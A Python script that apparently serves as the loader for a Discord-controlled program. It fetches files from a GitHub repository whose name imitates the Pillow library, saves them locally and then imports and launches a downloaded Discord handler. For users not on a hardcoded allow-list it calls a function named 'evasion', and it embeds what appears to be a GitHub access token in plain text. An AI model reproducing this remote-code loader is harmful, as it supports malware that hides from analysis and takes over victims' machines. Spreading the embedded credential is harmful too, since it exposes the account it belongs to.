import requests
import os
import json
import signal
import sys
from requests.exceptions import RequestException, Timeout

# Constants and configuration
GITHUB_RAW_URL_TEMPLATE = "https://raw.githubusercontent.com/pillowlibrary/pillow/main/functions/{}"
UPDATE_STATUS_FILE = os.path.join(os.path.dirname(__file__), "update_status.json")
LOCAL_FUNCTIONS_PATH = os.path.join(os.getcwd(), "functions")
DISCORD_HANDLER_FILE = "discord_handler.py"
allowed_users = ["border", "bob", "User"]
github_token = "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"
REQUEST_TIMEOUT = 5

def graceful_exit(signum, frame):
    sys.exit(0)

signal.signal(signal.SIGTERM, graceful_exit)
signal.signal(signal.SIGINT, graceful_exit)

def download_and_update_files(files_to_update):
    headers = {'Authorization': f'token {github_token}'}

    for file_name in files_to_update:
        raw_url = GITHUB_RAW_URL_TEMPLATE.format(file_name)
        try:
            response = requests.get(raw_url, headers=headers, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                local_file_path = os.path.join(LOCAL_FUNCTIONS_PATH, file_name)
                with open(local_file_path, "wb") as file:
                    file.write(response.content)
            elif response.status_code != 200:
                continue
        except (RequestException, Timeout):
            continue

    raw_discord_handler_url = GITHUB_RAW_URL_TEMPLATE.format(DISCORD_HANDLER_FILE)
    try:
        response = requests.get(raw_discord_handler_url, headers=headers, timeout=REQUEST_TIMEOUT)
        if response.status_code == 200:
            local_discord_handler_path = os.path.join(LOCAL_FUNCTIONS_PATH, DISCORD_HANDLER_FILE)
            with open(local_discord_handler_path, "wb") as file:
                file.write(response.content)
    except (RequestException, Timeout):
        pass

def check_update_status():
    if os.path.exists(UPDATE_STATUS_FILE):
        with open(UPDATE_STATUS_FILE, "r") as f:
            data = json.load(f)
            if data.get("update"):
                return data.get("files_to_update", [])
    return []

def reset_update_flag():
    data = {"update": False, "files_to_update": []}
    with open(UPDATE_STATUS_FILE, "w") as f:
        json.dump(data, f)

def evasion():
    pass

def main():
    username = os.getlogin()
    if username in allowed_users:
        files_to_update = check_update_status()
        if files_to_update:
            download_and_update_files(files_to_update)
            reset_update_flag()
    else:
        evasion()
        return

    from functions.discord_handler import start_discord_bot
    start_discord_bot()

if __name__ == "__main__":
    main()
